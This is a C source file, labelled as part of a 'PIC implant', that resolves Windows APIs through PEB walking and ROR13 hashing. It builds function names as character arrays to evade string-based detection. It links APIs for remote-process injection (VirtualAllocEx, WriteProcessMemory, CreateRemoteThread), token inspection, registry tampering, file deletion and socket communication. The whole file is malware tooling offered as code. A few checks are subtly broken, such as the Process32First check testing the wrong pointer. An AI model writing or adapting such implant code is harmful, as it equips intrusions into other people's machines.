/*
    Config.h

    Configuration definitions for PIC implant
*/
#include "Config.h"

bool LinkImports(PIMPORTS Imports)
{
    // -------------------- kernel32 --------------------
    Imports->LoadLibraryA = (FuncLoadLibraryA) GetProcAddressWithHash(0x0726774c);
    if (Imports->LoadLibraryA == NULL)
    {
        return false;
    }

    char kernel32Name[] = {'k', 'e', 'r', 'n', 'e', 'l', '3', '2', '.', 'd', 'l', 'l', '\0'};
    HMODULE hKernel32 = Imports->LoadLibraryA(kernel32Name);

    Imports->GetProcAddress = (FuncGetProcAddress)GetProcAddressWithHash(0x7802F749);
    if (Imports->GetProcAddress == NULL)
    {
        return false;
    }

    Imports->HeapFree = (FuncHeapFree) GetProcAddressWithHash(0xC35F9CF3);
    if (Imports->HeapFree == NULL)
    {
        return false;
    }

    Imports->GetProcessHeap = (FuncGetProcessHeap) GetProcAddressWithHash(0xF8245751);
    if (Imports->GetProcessHeap == NULL)
    {
        return false;
    }

    char heapreallocName[] = { 'H', 'e', 'a', 'p', 'R', 'e', 'A', 'l', 'l', 'o', 'c', '\0' };
    Imports->HeapReAlloc = (FuncHeapReAlloc) Imports->GetProcAddress(hKernel32, (const char *)heapreallocName);
    if (Imports->HeapReAlloc == NULL)
    {
        return false;
    }

    Imports->CreateFileA = (FuncCreateFileA) GetProcAddressWithHash(0x4FDAF6DA);
    if (Imports->CreateFileA == NULL)
    {
        return false;
    }

    char cfwName[] = { 'C', 'r', 'e', 'a', 't', 'e', 'F', 'i', 'l', 'e', 'W', '\0' };
    Imports->CreateFileW = (FuncCreateFileW) Imports->GetProcAddress(hKernel32, (const char *)cfwName);
    if (Imports->CreateFileW == NULL)
    {
        return false;
    }

    Imports->WriteFile = (FuncWriteFile) GetProcAddressWithHash(0x5BAE572D);
    if (Imports->WriteFile == NULL)
    {
        return false;
    }

    Imports->ReadFile = (FuncReadFile)GetProcAddressWithHash(0xBB5F9EAD);
    if (Imports->ReadFile == NULL)
    {
        return false;
    }

    Imports->CloseHandle = (FuncCloseHandle) GetProcAddressWithHash(0x528796C6);
    if (Imports->CloseHandle == NULL)
    {
        return false;
    }

    Imports->GetFileSize = (FuncGetFileSize) GetProcAddressWithHash(0x701E12C6);
    if (Imports->GetFileSize == NULL)
    {
        return false;
    }

    Imports->CreateToolhelp32Snapshot = (FuncCreateToolhelp32Snapshot) GetProcAddressWithHash(0x921E3980);
    if (Imports->CreateToolhelp32Snapshot == NULL)
    {
        return false;
    }

    Imports->Process32First = (FuncProcess32First) GetProcAddressWithHash(0x67E8A927);
    if (Imports->LoadLibraryA == NULL)
    {
        return false;
    }

    Imports->Process32Next = (FuncProcess32Next) GetProcAddressWithHash(0xBD01528D);
    if (Imports->Process32Next == NULL)
    {
        return false;
    }

    Imports->GetCurrentProcessId = (FuncGetCurrentProcessId) GetProcAddressWithHash(0x62C64749);
    if (Imports->GetCurrentProcessId == NULL)
    {
        return false;
    }

    uint8_t gmfnaName[] = {'G', 'e', 't', 'M', 'o', 'd', 'u', 'l', 'e', 'F', 'i', 'l', 'e', 'N', 'a', 'm', 'e', 'A', '\0'};
    Imports->GetModuleFileNameA = (FuncGetModuleFileNameA)Imports->GetProcAddress(hKernel32, (const char *)gmfnaName);
    if (Imports->GetModuleFileNameA == NULL)
    {
        return false;
    }

    uint8_t gcpName[] = { 'G', 'e', 't', 'C', 'u', 'r', 'r', 'e', 'n', 't', 'P', 'r', 'o', 'c', 'e', 's', 's', '\0' };
    Imports->GetCurrentProcess = (FuncGetCurrentProcess)Imports->GetProcAddress(hKernel32, (const char *)gcpName);
    if (Imports->GetCurrentProcess == NULL)
    {
        return false;
    }

    uint8_t vaName[] = { 'V', 'i', 'r', 't', 'u', 'a', 'l', 'A', 'l', 'l', 'o', 'c', '\0' };
    Imports->VirtualAlloc = (FuncVirtualAlloc)Imports->GetProcAddress(hKernel32, (const char *)vaName);
    if (Imports->VirtualAlloc == NULL)
    {
        return false;
    }

    uint8_t vfName[] = { 'V', 'i', 'r', 't', 'u', 'a', 'l', 'F', 'r', 'e', 'e', '\0' };
    Imports->VirtualFree = (FuncVirtualFree)Imports->GetProcAddress(hKernel32, (const char *)vfName);
    if (Imports->VirtualFree == NULL)
    {
        return false;
    }

    uint8_t vqName[] = { 'V', 'i', 'r', 't', 'u', 'a', 'l', 'Q', 'u', 'e', 'r', 'y', '\0' };
    Imports->VirtualQuery = (FuncVirtualQuery)Imports->GetProcAddress(hKernel32, (const char *)vqName);
    if (Imports->VirtualQuery == NULL)
    {
        return false;
    }

    uint8_t opName[] = { 'O', 'p', 'e', 'n', 'P', 'r', 'o', 'c', 'e', 's', 's', '\0' };
    Imports->OpenProcess = (FuncOpenProcess)Imports->GetProcAddress(hKernel32, (const char *)opName);
    if (Imports->OpenProcess == NULL)
    {
        return false;
    }

    uint8_t vaxName[] = { 'V', 'i', 'r', 't', 'u', 'a', 'l', 'A', 'l', 'l', 'o', 'c', 'E', 'x', '\0' };
    Imports->VirtualAllocEx = (FuncVirtualAllocEx)Imports->GetProcAddress(hKernel32, (const char *)vaxName);
    if (Imports->VirtualAllocEx == NULL)
    {
        return false;
    }

    uint8_t wpmName[] = { 'W', 'r', 'i', 't', 'e', 'P', 'r', 'o', 'c', 'e', 's', 's', 'M', 'e', 'm', 'o', 'r', 'y', '\0' };
    Imports->WriteProcessMemory = (FuncWriteProcessMemory)Imports->GetProcAddress(hKernel32, (const char*)wpmName);
    if (Imports->WriteProcessMemory == NULL)
    {
        return false;
    }

    uint8_t crtName[] = { 'C', 'r', 'e', 'a', 't', 'e', 'R', 'e', 'm', 'o', 't', 'e', 'T', 'h', 'r', 'e', 'a', 'd', '\0' };
    Imports->CreateRemoteThread = (FuncCreateRemoteThread)Imports->GetProcAddress(hKernel32, (const char*)crtName);
    if (Imports->CreateRemoteThread == NULL)
    {
        return false;
    }

    uint8_t eeswName[] = { 'E', 'x', 'p', 'a', 'n', 'd', 'E', 'n', 'v', 'i', 'r', 'o', 'n', 'm', 'e', 'n', 't', 'S', 't', 'r', 'i', 'n', 'g', 's', 'W', '\0' };
    Imports->ExpandEnvironmentStringsW = (FuncExpandEnvironmentStringsW)Imports->GetProcAddress(hKernel32, (const char*)eeswName);
    if (Imports->ExpandEnvironmentStringsW == NULL)
    {
        return false;
    }

    uint8_t dfwName[] = { 'D', 'e', 'l', 'e', 't', 'e', 'F', 'i', 'l', 'e', 'W', '\0' };
    Imports->DeleteFileW = (FuncDeleteFileW)Imports->GetProcAddress(hKernel32, (const char*)dfwName);
    if (Imports->DeleteFileW == NULL)
    {
        return false;
    }

    uint8_t glaName[] = { 'G', 'e', 't', 'L', 'a', 's', 't', 'E', 'r', 'r', 'o', 'r', '\0' };
    Imports->GetLastError = (FuncGetLastError)Imports->GetProcAddress(hKernel32, (const char*)glaName);
    if (Imports->GetLastError == NULL)
    {
        return false;
    }

    uint8_t gstName[] = { 'G', 'e', 't', 'S', 'y', 's', 't', 'e', 'm', 'T', 'i', 'm', 'e', '\0' };
    Imports->GetSystemTime = (FuncGetSystemTime)Imports->GetProcAddress(hKernel32, (const char*)gstName);
    if (Imports->GetSystemTime == NULL)
    {
        return false;
    }

    Imports->GetLastError = (FuncGetLastError)Imports->GetProcAddress(hKernel32, (const char*)glaName);
    if (Imports->GetLastError == NULL)
    {
        return false;
    }

    // -------------------- ws2_32 --------------------
    uint8_t winsockName[] = { 'w', 's', '2', '_', '3', '2', '.', 'd', 'l', 'l', '\0' };
    Imports->LoadLibraryA((const char *)winsockName); // Ensure that ws2_32.dll is linked first
    Imports->WSAStartup = (FuncWsaStartup)GetProcAddressWithHash(0x006B8029);
    if (Imports->WSAStartup == NULL)
    {
        return false;
    }

    Imports->WSACleanup = (FuncWsaCleanup)GetProcAddressWithHash(0xF44A6E2B);
    if (Imports->WSACleanup == NULL)
    {
        return false;
    }

    Imports->Socket = (FuncSocket)GetProcAddressWithHash(0xED83E9BA);
    if (Imports->Socket == NULL)
    {
        return false;
    }

    Imports->CloseSocket = (FuncCloseSocket)GetProcAddressWithHash(0x614D6E75);
    if (Imports->CloseSocket == NULL)
    {
        return false;
    }

    Imports->Connect = (FuncConnect)GetProcAddressWithHash(0x6174A599);
    if (Imports->Connect == NULL)
    {
        return false;
    }

    Imports->Send = (FuncSend)GetProcAddressWithHash(0x5F38EBC2);
    if (Imports->Send == NULL)
    {
        return false;
    }

    Imports->Recv = (FuncRecv)GetProcAddressWithHash(0x5FC8D902);
    if (Imports->Recv == NULL)
    {
        return false;
    }

    Imports->WSAGetLastError = (FuncWSAGetLastError)GetProcAddressWithHash(0x5DC69B1D);
    if (Imports->WSAGetLastError == NULL)
    {
        return false;
    }


    // -------------------- ntdll --------------------
    // forwarded to NTDLL.RtlAllocateHeap
    Imports->HeapAlloc = (FuncHeapAlloc) GetProcAddressWithHash(0x67CC0818);
    if (Imports->HeapAlloc == NULL)
    {
        return false;
    }
    Imports->DbgPrint = (FuncDbgPrint) GetProcAddressWithHash(0x59DD5F38);
    if (Imports->DbgPrint == NULL)
    {
        return false;
    }
    Imports->RtlGetVersion = (FuncRtlGetVersion) GetProcAddressWithHash(0x73809D5B);
    if (Imports->RtlGetVersion == NULL)
    {
        return false;
    }


    // -------------------- advapi --------------------
    uint8_t advapiName[] = { 'a', 'd', 'v', 'a', 'p', 'i', '3', '2', '.', 'd', 'l', 'l', '\0' };
    HMODULE hAdvapi = Imports->LoadLibraryA((const char *)advapiName);

    uint8_t optName[] = { 'O', 'p', 'e', 'n', 'P', 'r', 'o', 'c', 'e', 's', 's', 'T', 'o', 'k', 'e', 'n', '\0' };
    Imports->OpenProcessToken = (FuncOpenProcessToken)Imports->GetProcAddress(hAdvapi, (const char *)optName);
    if (Imports->OpenProcessToken == NULL)
    {
        return false;
    }

    uint8_t gtiName[] = { 'G', 'e', 't', 'T', 'o', 'k', 'e', 'n', 'I', 'n', 'f', 'o', 'r', 'm', 'a', 't', 'i', 'o', 'n', '\0' };
    Imports->GetTokenInformation = (FuncGetTokenInformation)Imports->GetProcAddress(hAdvapi, (const char *)gtiName);
    if (Imports->GetTokenInformation == NULL)
    {
        return false;
    }

    uint8_t lpnaName[] = { 'L', 'o', 'o', 'k', 'u', 'p', 'P', 'r', 'i', 'v', 'i', 'l', 'e', 'g', 'e', 'N', 'a', 'm', 'e', 'A', '\0' };
    Imports->LookupPrivilegeNameA = (FuncLookupPrivilegeNameA)Imports->GetProcAddress(hAdvapi, (const char *)lpnaName);
    if (Imports->LookupPrivilegeNameA == NULL)
    {
        return false;
    }

    uint8_t rgvwName[] = { 'R', 'e', 'g', 'G', 'e', 't', 'V', 'a', 'l', 'u', 'e', 'W', '\0' };
    Imports->RegGetValueW = (FuncRegGetValueW)Imports->GetProcAddress(hAdvapi, (const char *)rgvwName);
    if (Imports->RegGetValueW == NULL)
    {
        return false;
    }

    uint8_t rdkvwName[] = { 'R', 'e', 'g', 'D', 'e', 'l', 'e', 't', 'e', 'K', 'e', 'y', 'V', 'a', 'l', 'u', 'e', 'W', '\0' };
    Imports->RegDeleteKeyValueW = (FuncRegDeleteKeyValueW)Imports->GetProcAddress(hAdvapi, (const char *)rdkvwName);
    if (Imports->RegDeleteKeyValueW == NULL)
    {
        return false;
    }

    uint8_t rskvwName[] = { 'R', 'e', 'g', 'S', 'e', 't', 'K', 'e', 'y', 'V', 'a', 'l', 'u', 'e', 'W', '\0' };
    Imports->RegSetKeyValueW = (FuncRegSetKeyValueW)Imports->GetProcAddress(hAdvapi, (const char *)rskvwName);
    if (Imports->RegSetKeyValueW == NULL)
    {
        return false;
    }


    // -------------------- msvcrt --------------------
    uint8_t msvcrtName[] = { 'm', 's', 'v', 'c', 'r', 't', '.', 'd', 'l', 'l', '\0' };
    HMODULE hMsvcrt = Imports->LoadLibraryA((const char *)msvcrtName);

    uint8_t snprintfName[] = { '_', 's', 'n', 'p', 'r', 'i', 'n', 't', 'f', '\0' };
    Imports->snprintf = (FuncSnprintf)Imports->GetProcAddress(hMsvcrt, (const char *)snprintfName);
    if (Imports->snprintf == NULL)
    {
        return false;
    }

    uint8_t vsnprintfName[] = { '_', 'v', 's', 'n', 'p', 'r', 'i', 'n', 't', 'f', '\0' };
    Imports->vsnprintf = (FuncVsnprintf)Imports->GetProcAddress(hMsvcrt, (const char *)vsnprintfName);
    if (Imports->vsnprintf == NULL)
    {
        return false;
    }

    uint8_t memcpy_sName[] = { 'm', 'e', 'm', 'c', 'p', 'y', '_', 's', '\0' };
    Imports->memcpy_s = (FuncMemcpy_s)Imports->GetProcAddress(hMsvcrt, (const char *) memcpy_sName);
    if (Imports->memcpy_s == NULL)
    {
        return false;
    }

    uint8_t wcslenName[] = { 'w', 'c', 's', 'l', 'e', 'n', '\0' };    Imports->wcslen = (FuncWcslen)Imports->GetProcAddress(hMsvcrt, (const char *) wcslenName);
    if (Imports->wcslen == NULL)
    {
        return false;
    }

    return true;
}


HMODULE GetProcAddressWithHash( _In_ uint32_t dwModuleFunctionHash )
{
    PPEB PebAddress;
    PMY_PEB_LDR_DATA pLdr;
    PMY_LDR_DATA_TABLE_ENTRY pDataTableEntry;
    void* pModuleBase;
    PIMAGE_NT_HEADERS pNTHeader;
    uint32_t dwExportDirRVA;
    PIMAGE_EXPORT_DIRECTORY pExportDir;
    PLIST_ENTRY pNextModule;
    uint32_t dwNumFunctions;
    uint16_t usOrdinalTableIndex;
    uint32_t* pdwFunctionNameBase;
    const char* pFunctionName;
    UNICODE_STRING BaseDllName;
    uint32_t dwModuleHash;
    uint32_t dwFunctionHash;
    const char* pTempChar;

#if defined(_WIN64)
    PebAddress = (PPEB) __readgsqword( 0x60 );
#elif defined(_M_ARM)
    // I can assure you that this is not a mistake. The C compiler improperly emits the proper opcodes
    // necessary to get the PEB.Ldr address
    PebAddress = (PPEB) ( (uintptr_t) _MoveFromCoprocessor(15, 0, 13, 0, 2) + 0);
    __emit( 0x00006B1B );
#else
    PebAddress = (PPEB) __readfsdword( 0x30 );
#endif

    pLdr = (PMY_PEB_LDR_DATA) PebAddress->Ldr;
    pNextModule = pLdr->InLoadOrderModuleList.Flink;
    pDataTableEntry = (PMY_LDR_DATA_TABLE_ENTRY) pNextModule;

    while (pDataTableEntry->DllBase != NULL)
    {
        dwModuleHash = 0;
        pModuleBase = pDataTableEntry->DllBase;
        BaseDllName = pDataTableEntry->BaseDllName;
        pNTHeader = (PIMAGE_NT_HEADERS) ((uintptr_t) pModuleBase + ((PIMAGE_DOS_HEADER) pModuleBase)->e_lfanew);
        dwExportDirRVA = pNTHeader->OptionalHeader.DataDirectory[0].VirtualAddress;

        // Get the next loaded module entry
        pDataTableEntry = (PMY_LDR_DATA_TABLE_ENTRY) pDataTableEntry->InLoadOrderLinks.Flink;

        // If the current module does not export any functions, move on to the next module.
        if (dwExportDirRVA == 0)
        {
            continue;
        }

        // Calculate the module hash
        for (unsigned idx = 0; idx < BaseDllName.MaximumLength; idx++)
        {
            pTempChar = ((const char*) BaseDllName.Buffer + idx);

            dwModuleHash = ROTR32( dwModuleHash, 13 );

            if ( *pTempChar >= 0x61 )
            {
                dwModuleHash += *pTempChar - 0x20;
            }
            else
            {
                dwModuleHash += *pTempChar;
            }
        }

        pExportDir = (PIMAGE_EXPORT_DIRECTORY) ((uintptr_t) pModuleBase + dwExportDirRVA);

        dwNumFunctions = pExportDir->NumberOfNames;
        pdwFunctionNameBase = (uint32_t*) ((PCHAR) pModuleBase + pExportDir->AddressOfNames);

        for (unsigned idx = 0; idx < dwNumFunctions; idx++)
        {
            dwFunctionHash = 0;
            pFunctionName = (const char*) (*pdwFunctionNameBase + (uintptr_t) pModuleBase);
            pdwFunctionNameBase++;

            pTempChar = pFunctionName;

            do
            {
                dwFunctionHash = ROTR32( dwFunctionHash, 13 );
                dwFunctionHash += *pTempChar;
                pTempChar++;
            } while (*(pTempChar - 1) != 0);

            dwFunctionHash += dwModuleHash;

            if (dwFunctionHash == dwModuleFunctionHash)
            {
                usOrdinalTableIndex = *(uint16_t*)(uintptr_t)((uintptr_t)pModuleBase + pExportDir->AddressOfNameOrdinals + (2ULL * idx));
                return (HMODULE) ((uintptr_t)pModuleBase + *(uint32_t*)(uintptr_t)((uintptr_t)pModuleBase + pExportDir->AddressOfFunctions + (4ULL * usOrdinalTableIndex)));
            }
        }
    }

    // All modules have been exhausted and the function was not found.
    return NULL;
}
